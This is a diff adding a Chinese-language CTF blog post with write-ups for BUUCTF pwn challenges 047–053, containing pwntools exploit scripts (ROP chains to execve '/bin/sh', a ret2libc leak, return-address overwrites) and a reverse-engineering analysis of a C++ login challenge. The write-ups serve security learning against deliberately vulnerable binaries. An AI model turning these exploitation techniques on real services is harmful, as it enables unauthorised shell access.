@@ -150,6 +150,151 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's BLOG">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/28/buuctf-pwn-write-ups-6/" class="post-title-link" itemprop="url">buuctf-pwn write-ups (6)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-02-28 22:09:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:09:00+08:00">2023-02-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-03-01 11:31:03" itemprop="dateModified" datetime="2023-03-01T11:31:03+08:00">2023-03-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>7.5k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>7 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="buu047-cmcc_simplerop"><a class="markdownIt-Anchor" href="#buu047-cmcc_simplerop"></a> buu047-cmcc_simplerop</h1>
+<p>和上一道题的思路完全相同。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26121</span>)</span><br><span class="line">int80 = <span class="number">0x80493E1</span></span><br><span class="line">popeax_ret = <span class="number">0x80BAE06</span></span><br><span class="line">popedx_ret = <span class="number">0x806e82a</span></span><br><span class="line">popecx_ebx_ret = <span class="number">0x806E851</span></span><br><span class="line">addesp0x14_ret = <span class="number">0x807b36c</span></span><br><span class="line">bss = <span class="number">0x80EB060</span></span><br><span class="line">read = <span class="number">0x806CD50</span></span><br><span class="line">payload = cyclic(<span class="number">0x14</span> + <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(read)			<span class="comment"># call read()</span></span><br><span class="line">payload += p32(addesp0x14_ret)	<span class="comment"># return address, add esp to execute latter ROP</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment"># arg #1 of read(): stdin</span></span><br><span class="line">payload += p32(bss)				<span class="comment"># arg #2 of read(): a bss address</span></span><br><span class="line">payload += p32(<span class="number">0x8</span>)				<span class="comment"># arg #3 of read(): read length</span></span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">payload += p32(popeax_ret)		<span class="comment"># eax = 0x11(SYS_EXECVE)</span></span><br><span class="line">payload += p32(<span class="number">11</span>)</span><br><span class="line">payload += p32(popecx_ebx_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment"># ebx = &#x27;/bin/sh&#x27;</span></span><br><span class="line">payload += p32(bss)				<span class="comment"># edx = 0</span></span><br><span class="line">payload += p32(popedx_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment"># ecx = 0</span></span><br><span class="line">payload += p32(int80)			<span class="comment"># int 80</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu048-picoctf_2018_buffer-overflow-2"><a class="markdownIt-Anchor" href="#buu048-picoctf_2018_buffer-overflow-2"></a> buu048-picoctf_2018_buffer overflow 2</h1>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27446</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">0x6C</span>+<span class="number">4</span>) + p32(<span class="number">0x80485CB</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xdeadc0de</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu049-xdctf2015_pwn200"><a class="markdownIt-Anchor" href="#buu049-xdctf2015_pwn200"></a> buu049-xdctf2015_pwn200</h1>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25724</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x6C</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Welcome to XDCTF2015~!\n&#x27;</span>, payload)</span><br><span class="line">write = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write)</span><br><span class="line">base = write - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys = libc.dump(<span class="string">&#x27;system&#x27;</span>) + base</span><br><span class="line">binsh = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) + base</span><br><span class="line">payload = cyclic(<span class="number">0x6C</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(sys)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu050-bbys_tu_2016"><a class="markdownIt-Anchor" href="#buu050-bbys_tu_2016"></a> buu050-bbys_tu_2016</h1>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27499</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">0xC</span> + <span class="number">12</span>) + p32(<span class="number">0x804856D</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu051-mrctf2020_easyoverflow"><a class="markdownIt-Anchor" href="#buu051-mrctf2020_easyoverflow"></a> buu051-mrctf2020_easyoverflow</h1>
+<p>连上之后输48个无效字节+‘n0t_r3@11y_f1@g’</p>
+<h1 id="buu052-wustctf2020_getshell_2"><a class="markdownIt-Anchor" href="#buu052-wustctf2020_getshell_2"></a> buu052-wustctf2020_getshell_2</h1>
+<p>这道题只能溢出到返回地址+4字节的地方，直接修改返回地址到system函数的话参数写不进去，所以利用shell函数返回到指令’call _system’的地方，在后面就可以写函数参数’sh’（截取/bbbbbbbbin_what_the_f?ck__–??/sh的最后两个字节）了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29467</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">24</span>+<span class="number">4</span>) + p32(<span class="number">0x8048529</span>) + p32(<span class="number">0x8048670</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu053-zjctf-2019login"><a class="markdownIt-Anchor" href="#buu053-zjctf-2019login"></a> buu053-[ZJCTF 2019]Login</h1>
+<p>第一道C++ pwn题。这也是我第一次认真在做一道C++ pwn的题目。<br />
+当然首先，我们需要会逆向C<ins>程序。C</ins>是C的超集，有很多C中没有的东西。其中最为重要的就是类与对象的识别了。<br />
+在这一题中，程序的符号表貌似没有被删除，我们可以看到IDA为我们分析出来的各种函数名与类名称。<br />
+<img src="1.png" alt="" /><br />
+其中容易发现程序中定义了两个类：User和Admin，而且似乎有三个main中定义的lambda函数。</p>
+<p>程序中无法查看User类的具体结构，因此我们需要手动创建User类结构体，在IDA的Structures窗口中定义：Ins快捷键创建结构体，Del删除结构体，D/A/*创建结构体成员（常用D），N修改成员名，U删除成员。如下图：（具体为什么要这样定义看下面的分析）<br />
+<img src="2.png" alt="" /></p>
+<p>通过User类的构造函数发现，构造函数在User，User+8，User+0x58处进行了赋值操作，这里的后面两个均是使用strncpy函数赋值，因此判断是字符串。第一个声明赋值指向的是这样一个结构，有两个函数指针，判断是User类的虚函数表，因为C++类的虚函数表通常都是放在类的最开头位置。可以看到User类中定义了两个虚函数get_password和shell。使用快捷键Y可以修改参数的类型，修改为合适的类型之后，反汇编出来的代码中就不会有一大堆强制转型了，看上去舒服很多。<br />
+<img src="3.png" alt="" /><br />
+又通过User类的get_password方法可以判断出后面两个大小为0x50的字符串中到底哪个是用户名哪个是密码。使用快捷键N可以修改参数或变量的名字，修改之后的User类构造函数如下图：<br />
+<img src="4.png" alt="" /><br />
+另外，在main函数中发现了login变量，其属于User类，且位于bss段中，判断是User类全局变量对象。我们将bss段中的这个对象修改类型发现大小正好符合，说明我们之前定义的User类结构是正确的。<br />
+<img src="5.png" alt="" /><br />
+<img src="6.png" alt="" /><br />
+再看一下Admin类的构造函数，发现其调用了User类的构造函数，因此判断Admin类是User类的子类。<br />
+<img src="7.png" alt="" /><br />
+从Admin类虚函数表中含有User类函数也可以说明Admin类是User的子类，且Admin类覆写了User类的shell方法，打开发现User类的shell没有任何作用，而Admin类的shell方法就是直接执行’/bin/sh’，是一个后门。而get_password类没有覆写，在User类中仅仅是用了virtual声明而已。<br />
+<img src="8.png" alt="" /><br />
+现在，我们已经将程序中主要的类、对象分析完毕，main函数的前半部分我们可以读懂了。<br />
+<img src="9.png" alt="" /><br />
+在main函数中，实例化了一个Admin对象，用户名为admin，密码为2jctf_pa5sw0rd。然后接受用户的输入设置全局User类对象的用户名和密码。</p>
+<p>然后main函数用lambda函数做了一些什么事情，我们进入password_checker的某个函数看一下。<br />
+<img src="10.png" alt="" /><br />
+这个函数进行密码输入的比较，如果输入密码正确就执行exec函数指针指向的函数。<br />
+根据这个函数的声明，推测password_checker应该是一个结构体，其中包含了后面的lambda函数（注意这个函数应该是一个定义于password_checker结构体中的lambda函数，注意password_checker与lambda函数之间是以::连接）<br />
+<img src="11.png" alt="" /><br />
+在password_checker函数中发现了checker结构体的赋值操作，password_checker中只有这一个函数指针存在。<br />
+<img src="12.png" alt="" /><br />
+因此这一段代码原本的作用是：检查密码是否输入正确，如果正确则执行greeting_func函数：<br />
+<img src="13.png" alt="" /><br />
+但是经过实地运行发现，在lambda函数中会发生段错误，错就错在exec函数指针上。原本指针的值应为0x400A90，但是执行到这里的时候发现已经被改成了0x400090。<br />
+<img src="14.jpeg" alt="" /><br />
+进一步跟踪调试发现，是strip_newline函数自动识别换行符（ASCII码为0xA），然后给这个地址错误地修改了，变成了一个无效的值。</p>
+<p>这给了我们提示：strip_newline是在lambda函数中调用的，但是却能够修改exec函数的地址，通过调试我们不难发现，exec是一个指针，通过main函数调用password_checker函数获取，但是这是password_checker的局部变量，其地址应该在main函数栈帧的低地址处（main函数实际上没有栈帧，这里类比其他函数的栈帧方便理解），也就是main函数执行时esp的低地址处，而调用其他函数时这里的地址自然就有可能会受到影响。由此可见，如果我们输入密码的时候修改这里的地址值到Admin类的shell函数地址，就能够拿到shell了。</p>
+<p>因此，本题的漏洞点在于返回局部变量的值，属于逻辑错误。子函数返回到父函数的返回值不应该是子函数局部变量的值。漏洞本身不难，但是对于逆向C++而言还是一次很好的训练与学习。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26270</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2jctf_pa5sw0rd\x00\x00&#x27;</span> + p64(<span class="number">0x400E88</span>) * <span class="number">8</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>尝试使用CLion还原出程序的源代码：（C++基础不扎实，尽量还原）</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">strip_newline</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int64_t</span> length)</span></span>&#123;</span><br><span class="line">    <span class="type">char</span>* i;</span><br><span class="line">    <span class="keyword">for</span>(i = &amp;buf[length]; i &gt;= buf; i--)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( *i == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">            *i = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">char</span> username[<span class="number">0x50</span>]&#123;&#125;;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">0x50</span>]&#123;&#125;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">User</span>()&#123;&#125;</span><br><span class="line">    <span class="built_in">User</span>(<span class="type">const</span> <span class="type">char</span>* username, <span class="type">const</span> <span class="type">char</span>* password)&#123;</span><br><span class="line">        <span class="built_in">strncpy</span>(<span class="keyword">this</span>-&gt;username, username, <span class="number">0x50</span>);</span><br><span class="line">        <span class="built_in">strncpy</span>(<span class="keyword">this</span>-&gt;password, password, <span class="number">0x50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">read_name</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="type">char</span> name[<span class="number">80</span>];</span><br><span class="line">        <span class="built_in">fgets</span>(name, <span class="number">79</span>, stdin);</span><br><span class="line">        <span class="built_in">strip_newline</span>(name, <span class="number">80</span>);</span><br><span class="line">        <span class="built_in">strncpy</span>(<span class="keyword">this</span>-&gt;username, name, <span class="number">0x50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">read_password</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="type">char</span> pwd[<span class="number">80</span>];</span><br><span class="line">        <span class="built_in">fgets</span>(pwd, <span class="number">79</span>, stdin);</span><br><span class="line">        <span class="built_in">strip_newline</span>(pwd, <span class="number">80</span>);</span><br><span class="line">        <span class="built_in">strncpy</span>(<span class="keyword">this</span>-&gt;password, pwd, <span class="number">0x50</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">char</span>* <span class="title">get_password</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No shell for you!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Admin</span> : User&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Admin</span>(<span class="type">const</span> <span class="type">char</span>* username, <span class="type">const</span> <span class="type">char</span>* password) : <span class="built_in">User</span>(username, password)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">shell</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">char</span>* <span class="title">get_password</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> User::<span class="built_in">get_password</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">checker</span>&#123;</span><br><span class="line">    <span class="built_in">void</span> (*check)();</span><br><span class="line">    <span class="type">int64_t</span> null[<span class="number">2</span>];</span><br><span class="line">&#125;checker;</span><br><span class="line"></span><br><span class="line"><span class="function">checker* <span class="title">password_checker</span><span class="params">(<span class="type">void</span> (*check)())</span></span>&#123;</span><br><span class="line">    checker checker;</span><br><span class="line">    checker.check = check;</span><br><span class="line">    <span class="keyword">return</span> &amp;checker;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">User login;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> admin_password[<span class="number">88</span>];</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Hello, World!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(admin_password, <span class="string">&quot;2jctf_pa5sw0rd&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;admin_password[<span class="number">15</span>], <span class="number">0</span>, <span class="number">65</span>);</span><br><span class="line">    <span class="function">Admin <span class="title">admin</span><span class="params">((<span class="type">const</span> <span class="type">char</span>*)<span class="string">&quot;admin&quot;</span>, admin_password)</span></span>;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">            <span class="string">&quot; _____   _  ____ _____ _____   _                _       \n&quot;</span></span><br><span class="line">            <span class="string">&quot;|__  /  | |/ ___|_   _|  ___| | |    ___   __ _(_)_ __  \n&quot;</span></span><br><span class="line">            <span class="string">&quot;  / /_  | | |     | | | |_    | |   / _ \\ / _` | | &#x27;_ \\ \n&quot;</span></span><br><span class="line">            <span class="string">&quot; / /| |_| | |___  | | |  _|   | |__| (_) | (_| | | | | |\n&quot;</span></span><br><span class="line">            <span class="string">&quot;/____\\___/ \\____| |_| |_|     |_____\\___/ \\__, |_|_| |_|\n&quot;</span></span><br><span class="line">            <span class="string">&quot;                                          |___/         &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter username: &quot;</span>);</span><br><span class="line">    login.<span class="built_in">read_name</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter password: &quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> greeting_func = []()-&gt;<span class="type">void</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&lt;===Welcome to ZJCTF!!!===&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> login.<span class="built_in">shell</span>();</span><br><span class="line">    &#125;;</span><br><span class="line">    checker* exec = <span class="built_in">password_checker</span>(greeting_func);</span><br><span class="line">    login.<span class="built_in">read_password</span>();</span><br><span class="line">    <span class="type">char</span>* admin_pwd = admin.<span class="built_in">get_password</span>();</span><br><span class="line">    <span class="type">char</span>* user_pwd = login.<span class="built_in">get_password</span>();</span><br><span class="line">    [](checker* exec, <span class="type">char</span>* admin_pwd, <span class="type">char</span>* user_pwd)-&gt;<span class="type">void</span>&#123;</span><br><span class="line">        <span class="type">char</span> s[<span class="number">88</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(admin_pwd, user_pwd))&#123;</span><br><span class="line">            <span class="built_in">snprintf</span>(s, <span class="number">0x50</span>uLL, <span class="string">&quot;Password accepted: %s\n&quot;</span>, s);</span><br><span class="line">            <span class="built_in">puts</span>(s);</span><br><span class="line">            exec-&gt;<span class="built_in">check</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;(exec, admin_pwd, user_pwd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1507,7 +1652,7 @@ exp：</p>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">149</span>
+          <span class="site-state-item-count">150</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1559,13 +1704,13 @@ exp：</p>
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
-    <span title="Symbols count total">1.3m</span>
+    <span title="Symbols count total">1.4m</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">20:25</span>
+    <span title="Reading time total">20:31</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
   </div>
